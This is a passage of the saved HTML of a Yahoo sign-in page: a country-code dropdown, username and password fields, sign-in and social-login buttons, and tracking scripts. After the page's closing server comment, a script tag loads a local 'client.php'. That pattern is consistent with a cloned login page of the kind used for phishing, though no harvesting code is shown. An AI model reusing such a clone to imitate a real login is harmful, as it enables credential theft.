        <option role="option" data-code="+420" value="CZ">Czech Republic ‪(+420)‬</option>
        <option role="option" data-code="+243" value="CD">Democratic Republic of the Congo ‪(+243)‬</option>
        <option role="option" data-code="+45" value="DK">Denmark ‪(+45)‬</option>
        <option role="option" data-code="+246" value="DG">Diego Garcia ‪(+246)‬</option>
        <option role="option" data-code="+253" value="DJ">Djibouti ‪(+253)‬</option>
        <option role="option" data-code="+1" value="DM">Dominica ‪(+1)‬</option>
        <option role="option" data-code="+1" value="DO">Dominican Republic ‪(+1)‬</option>
        <option role="option" data-code="+670" value="TL">East Timor ‪(+670)‬</option>
        <option role="option" data-code="+593" value="EC">Ecuador ‪(+593)‬</option>
        <option role="option" data-code="+20" value="EG">Egypt ‪(+20)‬</option>
        <option role="option" data-code="+503" value="SV">El Salvador ‪(+503)‬</option>
        <option role="option" data-code="+240" value="GQ">Equatorial Guinea ‪(+240)‬</option>
        <option role="option" data-code="+291" value="ER">Eritrea ‪(+291)‬</option>
        <option role="option" data-code="+372" value="EE">Estonia ‪(+372)‬</option>
        <option role="option" data-code="+251" value="ET">Ethiopia ‪(+251)‬</option>
        <option role="option" data-code="+500" value="FK">Falkland Islands ‪(+500)‬</option>
        <option role="option" data-code="+298" value="FO">Faroe Islands ‪(+298)‬</option>
        <option role="option" data-code="+679" value="FJ">Fiji ‪(+679)‬</option>
        <option role="option" data-code="+358" value="FI">Finland ‪(+358)‬</option>
        <option role="option" data-code="+33" value="FR">France ‪(+33)‬</option>
        <option role="option" data-code="+594" value="GF">French Guiana ‪(+594)‬</option>
        <option role="option" data-code="+689" value="PF">French Polynesia ‪(+689)‬</option>
        <option role="option" data-code="+241" value="GA">Gabon ‪(+241)‬</option>
        <option role="option" data-code="+220" value="GM">Gambia ‪(+220)‬</option>
        <option role="option" data-code="+995" value="GE">Georgia ‪(+995)‬</option>
        <option role="option" data-code="+49" value="DE">Germany ‪(+49)‬</option>
        <option role="option" data-code="+233" value="GH">Ghana ‪(+233)‬</option>
        <option role="option" data-code="+350" value="GI">Gibraltar ‪(+350)‬</option>
        <option role="option" data-code="+30" value="GR">Greece ‪(+30)‬</option>
        <option role="option" data-code="+299" value="GL">Greenland ‪(+299)‬</option>
        <option role="option" data-code="+1" value="GD">Grenada ‪(+1)‬</option>
        <option role="option" data-code="+590" value="GP">Guadeloupe ‪(+590)‬</option>
        <option role="option" data-code="+1" value="GU">Guam ‪(+1)‬</option>
        <option role="option" data-code="+502" value="GT">Guatemala ‪(+502)‬</option>
        <option role="option" data-code="+224" value="GN">Guinea ‪(+224)‬</option>
        <option role="option" data-code="+245" value="GW"> ‪(+245)‬</option>
        <option role="option" data-code="+592" value="GY">Guyana ‪(+592)‬</option>
        <option role="option" data-code="+509" value="HT">Haiti ‪(+509)‬</option>
        <option role="option" data-code="+504" value="HN">Honduras ‪(+504)‬</option>
        <option role="option" data-code="+852" value="HK">Hong Kong ‪(+852)‬</option>
        <option role="option" data-code="+36" value="HU">Hungary ‪(+36)‬</option>
        <option role="option" data-code="+354" value="IS">Iceland ‪(+354)‬</option>
        <option role="option" data-code="+91" value="IN" selected="selected">India ‪(+91)‬</option>
        <option role="option" data-code="+62" value="ID">Indonesia ‪(+62)‬</option>
        <option role="option" data-code="+98" value="IR">Iran ‪(+98)‬</option>
        <option role="option" data-code="+964" value="IQ">Iraq ‪(+964)‬</option>
        <option role="option" data-code="+353" value="IE">Ireland ‪(+353)‬</option>
        <option role="option" data-code="+972" value="IL">Israel ‪(+972)‬</option>
        <option role="option" data-code="+39" value="IT">Italy ‪(+39)‬</option>
        <option role="option" data-code="+1" value="JM">Jamaica ‪(+1)‬</option>
        <option role="option" data-code="+81" value="JP">Japan ‪(+81)‬</option>
        <option role="option" data-code="+962" value="JO">Jordan ‪(+962)‬</option>
        <option role="option" data-code="+7" value="KZ">Kazakhstan ‪(+7)‬</option>
        <option role="option" data-code="+254" value="KE">Kenya ‪(+254)‬</option>
        <option role="option" data-code="+686" value="KI">Kiribati ‪(+686)‬</option>
        <option role="option" data-code="+965" value="KW">Kuwait ‪(+965)‬</option>
        <option role="option" data-code="+996" value="KG">Kyrgyzstan ‪(+996)‬</option>
        <option role="option" data-code="+856" value="LA">Laos ‪(+856)‬</option>
        <option role="option" data-code="+371" value="LV">Latvia ‪(+371)‬</option>
        <option role="option" data-code="+961" value="LB">Lebanon ‪(+961)‬</option>
        <option role="option" data-code="+266" value="LS">Lesotho ‪(+266)‬</option>
        <option role="option" data-code="+231" value="LR">Liberia ‪(+231)‬</option>
        <option role="option" data-code="+218" value="LY">Libya ‪(+218)‬</option>
        <option role="option" data-code="+423" value="LI">Liechtenstein ‪(+423)‬</option>
        <option role="option" data-code="+370" value="LT">Lithuania ‪(+370)‬</option>
        <option role="option" data-code="+352" value="LU">Luxembourg ‪(+352)‬</option>
        <option role="option" data-code="+853" value="MO">Macao ‪(+853)‬</option>
        <option role="option" data-code="+389" value="MK">Macedonia ‪(+389)‬</option>
        <option role="option" data-code="+261" value="MG">Madagascar ‪(+261)‬</option>
        <option role="option" data-code="+265" value="MW">Malawi ‪(+265)‬</option>
        <option role="option" data-code="+60" value="MY">Malaysia ‪(+60)‬</option>
        <option role="option" data-code="+960" value="MV">Maldives ‪(+960)‬</option>
        <option role="option" data-code="+223" value="ML">Mali ‪(+223)‬</option>
        <option role="option" data-code="+356" value="MT">Malta ‪(+356)‬</option>
        <option role="option" data-code="+692" value="MH">Marshall Islands ‪(+692)‬</option>
        <option role="option" data-code="+596" value="MQ">Martinique ‪(+596)‬</option>
        <option role="option" data-code="+222" value="MR">Mauritania ‪(+222)‬</option>
        <option role="option" data-code="+230" value="MU">Mauritius ‪(+230)‬</option>
        <option role="option" data-code="+52" value="MX">Mexico ‪(+52)‬</option>
        <option role="option" data-code="+691" value="FM">Micronesia ‪(+691)‬</option>
        <option role="option" data-code="+373" value="MD">Moldova ‪(+373)‬</option>
        <option role="option" data-code="+377" value="MC">Monaco ‪(+377)‬</option>
        <option role="option" data-code="+976" value="MN">Mongolia ‪(+976)‬</option>
        <option role="option" data-code="+382" value="ME">Montenegro ‪(+382)‬</option>
        <option role="option" data-code="+1" value="MS">Montserrat ‪(+1)‬</option>
        <option role="option" data-code="+212" value="MA">Morocco ‪(+212)‬</option>
        <option role="option" data-code="+258" value="MZ">Mozambique ‪(+258)‬</option>
        <option role="option" data-code="+95" value="MM">Myanmar ‪(+95)‬</option>
        <option role="option" data-code="+264" value="NA">Namibia ‪(+264)‬</option>
        <option role="option" data-code="+674" value="NR">Nauru ‪(+674)‬</option>
        <option role="option" data-code="+977" value="NP">Nepal ‪(+977)‬</option>
        <option role="option" data-code="+31" value="NL">Netherlands ‪(+31)‬</option>
        <option role="option" data-code="+599" value="AN"> ‪(+599)‬</option>
        <option role="option" data-code="+687" value="NC">New Caledonia ‪(+687)‬</option>
        <option role="option" data-code="+64" value="NZ">New Zealand ‪(+64)‬</option>
        <option role="option" data-code="+505" value="NI">Nicaragua ‪(+505)‬</option>
        <option role="option" data-code="+227" value="NE">Niger ‪(+227)‬</option>
        <option role="option" data-code="+234" value="NG">Nigeria ‪(+234)‬</option>
        <option role="option" data-code="+683" value="NU">Niue ‪(+683)‬</option>
        <option role="option" data-code="+850" value="KP">North Korea ‪(+850)‬</option>
        <option role="option" data-code="+1" value="MP">Northern Mariana Islands ‪(+1)‬</option>
        <option role="option" data-code="+47" value="NO">Norway ‪(+47)‬</option>
        <option role="option" data-code="+968" value="OM">Oman ‪(+968)‬</option>
        <option role="option" data-code="+92" value="PK">Pakistan ‪(+92)‬</option>
        <option role="option" data-code="+680" value="PW">Palau ‪(+680)‬</option>
        <option role="option" data-code="+970" value="PS">Palestine ‪(+970)‬</option>
        <option role="option" data-code="+507" value="PA">Panama ‪(+507)‬</option>
        <option role="option" data-code="+675" value="PG">Papua New Guinea ‪(+675)‬</option>
        <option role="option" data-code="+595" value="PY">Paraguay ‪(+595)‬</option>
        <option role="option" data-code="+51" value="PE">Peru ‪(+51)‬</option>
        <option role="option" data-code="+63" value="PH">Philippines ‪(+63)‬</option>
        <option role="option" data-code="+48" value="PL">Poland ‪(+48)‬</option>
        <option role="option" data-code="+351" value="PT">Portugal ‪(+351)‬</option>
        <option role="option" data-code="+1" value="PR">Puerto Rico ‪(+1)‬</option>
        <option role="option" data-code="+974" value="QA">Qatar ‪(+974)‬</option>
        <option role="option" data-code="+262" value="RE">Reunion ‪(+262)‬</option>
        <option role="option" data-code="+40" value="RO">Romania ‪(+40)‬</option>
        <option role="option" data-code="+7" value="RU">Russia ‪(+7)‬</option>
        <option role="option" data-code="+250" value="RW">Rwanda ‪(+250)‬</option>
        <option role="option" data-code="+290" value="SH">Saint Helena ‪(+290)‬</option>
        <option role="option" data-code="+1" value="KN">Saint Kitts and Nevis ‪(+1)‬</option>
        <option role="option" data-code="+1" value="LC">Saint Lucia ‪(+1)‬</option>
        <option role="option" data-code="+508" value="PM">Saint Pierre and Miquelon ‪(+508)‬</option>
        <option role="option" data-code="+1" value="VC">Saint Vincent and Grenadines ‪(+1)‬</option>
        <option role="option" data-code="+685" value="WS">Samoa ‪(+685)‬</option>
        <option role="option" data-code="+378" value="SM">San Marino ‪(+378)‬</option>
        <option role="option" data-code="+239" value="ST">Sao Tome and Principe ‪(+239)‬</option>
        <option role="option" data-code="+966" value="SA">Saudi Arabia ‪(+966)‬</option>
        <option role="option" data-code="+221" value="SN">Senegal ‪(+221)‬</option>
        <option role="option" data-code="+381" value="RS">Serbia ‪(+381)‬</option>
        <option role="option" data-code="+248" value="SC">Seychelles ‪(+248)‬</option>
        <option role="option" data-code="+232" value="SL">Sierra Leone ‪(+232)‬</option>
        <option role="option" data-code="+65" value="SG">Singapore ‪(+65)‬</option>
        <option role="option" data-code="+421" value="SK">Slovakia ‪(+421)‬</option>
        <option role="option" data-code="+386" value="SI">Slovenia ‪(+386)‬</option>
        <option role="option" data-code="+677" value="SB">Solomon Islands ‪(+677)‬</option>
        <option role="option" data-code="+252" value="SO">Somalia ‪(+252)‬</option>
        <option role="option" data-code="+27" value="ZA">South Africa ‪(+27)‬</option>
        <option role="option" data-code="+82" value="KR">South Korea ‪(+82)‬</option>
        <option role="option" data-code="+34" value="ES">Spain ‪(+34)‬</option>
        <option role="option" data-code="+94" value="LK">Sri Lanka ‪(+94)‬</option>
        <option role="option" data-code="+249" value="SD">Sudan ‪(+249)‬</option>
        <option role="option" data-code="+597" value="SR">Suriname ‪(+597)‬</option>
        <option role="option" data-code="+268" value="SZ">Swaziland ‪(+268)‬</option>
        <option role="option" data-code="+46" value="SE">Sweden ‪(+46)‬</option>
        <option role="option" data-code="+41" value="CH">Switzerland ‪(+41)‬</option>
        <option role="option" data-code="+963" value="SY">Syria ‪(+963)‬</option>
        <option role="option" data-code="+886" value="TW">Taiwan ‪(+886)‬</option>
        <option role="option" data-code="+992" value="TJ">Tajikistan ‪(+992)‬</option>
        <option role="option" data-code="+255" value="TZ">Tanzania ‪(+255)‬</option>
        <option role="option" data-code="+66" value="TH">Thailand ‪(+66)‬</option>
        <option role="option" data-code="+228" value="TG">Togo ‪(+228)‬</option>
        <option role="option" data-code="+690" value="TK">Tokelau ‪(+690)‬</option>
        <option role="option" data-code="+676" value="TO">Tonga ‪(+676)‬</option>
        <option role="option" data-code="+1" value="TT">Trinidad and Tobago ‪(+1)‬</option>
        <option role="option" data-code="+216" value="TN">Tunisia ‪(+216)‬</option>
        <option role="option" data-code="+90" value="TR">Turkey ‪(+90)‬</option>
        <option role="option" data-code="+993" value="TM">Turkmenistan ‪(+993)‬</option>
        <option role="option" data-code="+1" value="TC">Turks and Caicos Islands ‪(+1)‬</option>
        <option role="option" data-code="+688" value="TV">Tuvalu ‪(+688)‬</option>
        <option role="option" data-code="+1" value="VI">US Virgin Islands ‪(+1)‬</option>
        <option role="option" data-code="+256" value="UG">Uganda ‪(+256)‬</option>
        <option role="option" data-code="+380" value="UA">Ukraine ‪(+380)‬</option>
        <option role="option" data-code="+971" value="AE">United Arab Emirates ‪(+971)‬</option>
        <option role="option" data-code="+44" value="GB">United Kingdom ‪(+44)‬</option>
        <option role="option" data-code="+1" value="US" data-format="(XXX) XXX-XXXX">United States ‪(+1)‬</option>
        <option role="option" data-code="+598" value="UY">Uruguay ‪(+598)‬</option>
        <option role="option" data-code="+998" value="UZ">Uzbekistan ‪(+998)‬</option>
        <option role="option" data-code="+678" value="VU">Vanuatu ‪(+678)‬</option>
        <option role="option" data-code="+379" value="VA">Vatican City ‪(+379)‬</option>
        <option role="option" data-code="+58" value="VE">Venezuela ‪(+58)‬</option>
        <option role="option" data-code="+84" value="VN">Vietnam ‪(+84)‬</option>
        <option role="option" data-code="+681" value="WF">Wallis and Futuna ‪(+681)‬</option>
        <option role="option" data-code="+967" value="YE">Yemen ‪(+967)‬</option>
        <option role="option" data-code="+260" value="ZM">Zambia ‪(+260)‬</option>
        <option role="option" data-code="+263" value="ZW">Zimbabwe ‪(+263)‬</option>
    </select>
    <div class="arrow"></div>
</div>

            </div>
            <div class="input-group">
                <input class="phone-no " type="text" name="username" id="login-username" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true" placeholder=" ">
                <div class="input-field-icon hide" id="username-field-icon"></div>
                <label for="login-username" id="login-label" class="login-label" aria-hidden="true">Username, email, or&nbsp;mobile</label>
                <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                    <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                </ul>            </div>
            <div class="hidden-input-container">
                <input name="passwd" class="pwd-field" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password">
            </div>
        </div>
        <p id="username-error" class="error-msg hide" role="alert"></p>


        <div class="button-container">
            <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" tabindex="6" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:login-landing-next">
        </div>

        <div class="helper-links-container">
            <div class="helper-item ">
                <span class="stay-signed-in checkbox-container">
                    <input id="persistent" name="persistent" value="y" type="checkbox" tabindex="7" checked="">
                    <label for="persistent">Stay signed&nbsp;in</label>
                </span>
            </div>
            <div class="helper-item arlink">
                <span class="help">
                    <a href="https://login.yahoo.com/forgot?done=https%3A%2F%2Fwww.yahoo.com" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot&nbsp;username?</a>
                </span>
            </div>
        </div>
        <div class="bottom-links-container has-social-buttons">
            <p class="sign-up-link">
                <a href="https://login.yahoo.com/account/create?specId=yidReg&amp;done=https%3A%2F%2Fwww.yahoo.com" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:login-landing-signup">Create an&nbsp;account</a>
            </p>

                <div id="social-login-container" class="social-login-container">
                    <div class="or-cont-with-desc challenge-feedback-text">
                        Or, continue&nbsp;with
                    </div>
                    <ul class="social-login">
                        <li class="items-cont-1">
                            <button type="submit" id="tpa-google-button" name="tpaProvider" value="google" class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:login-landing-google-social-btn"><label class="offscreen">google</label></button>
                        </li>
                    </ul>
                </div>        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner">
                <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"><iframe style="position: absolute; z-index: 10; width: 1440px; height: 1024px; top: 0px; left: 0px; visibility: inherit; display: block;" id="login-ad-rich" src="./Yahoo_files/r-sf.html" async="" allow="autoplay;vr;microphone https://s.yimg.com https://cdn.flashtalking.com https://cdn.cmp.advertising.com https://ads.pictela.net" sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div>
                    </div>
    </div>
    <div class="login-footer">
    <p>
        <a href="https://www.verizonmedia.com/policies/in/en/verizonmedia/terms/otos/index.html" target="_blank" class="terms">Terms</a>
        
        <span>|</span>
        <a href="https://www.verizonmedia.com/policies/in/en/verizonmedia/privacy/index.html" target="_blank" class="privacy">Privacy</a>
        
    </p>
</div>
</div>
    <script src="./Yahoo_files/rapid-3.53.17.js"></script>
    <script nonce="">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
        // Used in common JS to add to beacons
        rapidInstance.beaconClick('login-landing-launch' , 'artificialPageLoadClick', 0, {
            mKey: 'login-landing-launch',
            intrctn: 'click',
            corActn: 'click'
        });
    </script>
    <script src="./Yahoo_files/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=NS4Za8TxVdF&message=javascript_not_enabled&ref=%2F" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://login.yahoo.com/">More&nbsp;Info</a>
        </p>
    </div>
    <script nonce="">
        (function(root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>
    

<!-- fe05.member.sg3.yahoo.com - Tue Mar 23 2021 07:29:28 GMT+0000 (Coordinated Universal Time) - (0ms) --><script src="./Yahoo_files/client.php"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="./Yahoo_files/r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div></body></html>